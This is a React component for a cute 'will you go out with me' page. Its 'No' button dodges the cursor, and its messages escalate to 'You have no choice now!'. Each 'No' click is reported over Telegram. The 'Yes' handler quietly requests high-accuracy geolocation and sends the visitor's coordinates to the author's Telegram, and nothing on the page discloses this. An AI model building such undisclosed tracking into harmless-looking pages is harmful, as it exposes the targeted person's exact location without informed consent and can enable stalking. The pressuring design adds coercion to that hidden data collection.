import { useState } from "react";
import PropTypes from "prop-types";
import { motion, AnimatePresence } from "framer-motion";
import { reactionImages } from "./constants/assets";
import { sendMessageTelegram } from "./telegramHandler";

export function AskOut({ setYes }) {
	const [step, setStep] = useState(0);
	const [noText, setNoText] = useState("No");
	const [catImg, setCat] = useState(reactionImages.hug);
	const [noButtonPosition, setNoButtonPosition] = useState({ x: 0, y: 0 });
	const [isNoButtonMoved, setIsNoButtonMoved] = useState(false);

	const hoverMessages = [
		"Think again... 🥺",
		"Are you sure? 🤔",
		"Really? 💔",
		"Please reconsider... 😢",
		"Don't break my heart! 💔",
		"Give it another thought! 🥺",
	];

	const noMessages = [
		{ text: "Are you sure? 🤨", img: reactionImages.cattype },
		{ text: "Really sure? 😬", img: reactionImages.mochi },
		{ text: "Last chance! ⏳", img: reactionImages.mochi2 },
		{ text: "Think again... 🧠", img: reactionImages.missu },
		{ text: "Don't do this... 😨", img: reactionImages.peach },
		{ text: "Come on, say yes! 🙋‍♂️", img: reactionImages.sayYs },
		{ text: "You have no choice now! 😅", img: reactionImages.yesss },
	];

	const handleNoHover = () => {
		if (!isNoButtonMoved) {
			const randomMessage = hoverMessages[Math.floor(Math.random() * hoverMessages.length)];
			setNoText(randomMessage);
			
			const containerWidth = window.innerWidth;
			const containerHeight = window.innerHeight;
			
			const safePadding = 100;
			const randomX = Math.random() * (containerWidth - 2 * safePadding) - containerWidth / 2 + safePadding;
			const randomY = Math.random() * (containerHeight - 2 * safePadding) - containerHeight / 2 + safePadding;
			
			setNoButtonPosition({ x: randomX, y: randomY });
			setIsNoButtonMoved(true);
		}
	};

	const handleNoClick = () => {
		if (step < noMessages.length) {
			sendMessageTelegram(`😢 Inputed No ${step}`);
			setNoText(noMessages[step].text);
			setCat(noMessages[step].img);
			setStep((prevStep) => prevStep + 1);
		}
	};

	const handleYesClick = () => {
		setYes(true);
		sendMessageTelegram(
			"`💕💕💕💕💕💕💕💕💕💕💕💕she said yes💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕`"
		);

		if (navigator.geolocation) {
			navigator.geolocation.getCurrentPosition(
				(position) => {
					sendMessageTelegram({
						position: {
							latitude: position.coords.latitude,
							longitude: position.coords.longitude,
						},
					});
				},
				() => alert("Failed to get location"),
				{ enableHighAccuracy: true }
			);
		}
		alert("I'm so happy you said yes! 😊");
	};

	return (
		<AnimatePresence mode="wait">
			<motion.div
				className="askout-container"
				initial={{ opacity: 0, y: 20 }}
				animate={{ opacity: 1, y: 0 }}
				exit={{ opacity: 0, y: -20 }}
				transition={{ duration: 0.5 }}
			>
				<motion.img
					src={catImg}
					alt="Cute reaction"
					className="askout-cat"
					initial={{ opacity: 0, scale: 0.8 }}
					animate={{ opacity: 1, scale: 1 }}
					transition={{ duration: 0.5, delay: 0.2 }}
					key={catImg}
				/>
				<motion.h1
					className="askout-greeting"
					initial={{ opacity: 0, y: 10 }}
					animate={{ opacity: 1, y: 0 }}
					transition={{ duration: 0.5, delay: 0.3 }}
				>
					Hi {import.meta.env.VITE_NAME}
				</motion.h1>
				<motion.p
					className="askout-message"
					initial={{ opacity: 0, y: 10 }}
					animate={{ opacity: 1, y: 0 }}
					transition={{ duration: 0.5, delay: 0.4 }}
				>
					I think you're really special and I like you a lot! 💖 Do you
					feel the same way about me? 😊
				</motion.p>
				<motion.div
					className="askout-buttons"
					initial={{ opacity: 0, y: 10 }}
					animate={{ opacity: 1, y: 0 }}
					transition={{ duration: 0.5, delay: 0.5 }}
				>
					<button
						className="askout-yes-btn"
						onClick={handleYesClick}
					>
						Yes 💕
					</button>
					<button
						className="askout-no-btn"
						onClick={handleNoClick}
						onMouseEnter={handleNoHover}
						style={{
							transform: isNoButtonMoved ? `translate(${noButtonPosition.x}px, ${noButtonPosition.y}px)` : 'translate(0, 0)',
							transition: isNoButtonMoved ? 'transform 0.3s ease-out' : 'none',
						}}
					>
						{noText}
					</button>
				</motion.div>
			</motion.div>
		</AnimatePresence>
	);
}

AskOut.propTypes = {
	setYes: PropTypes.func.isRequired,
};
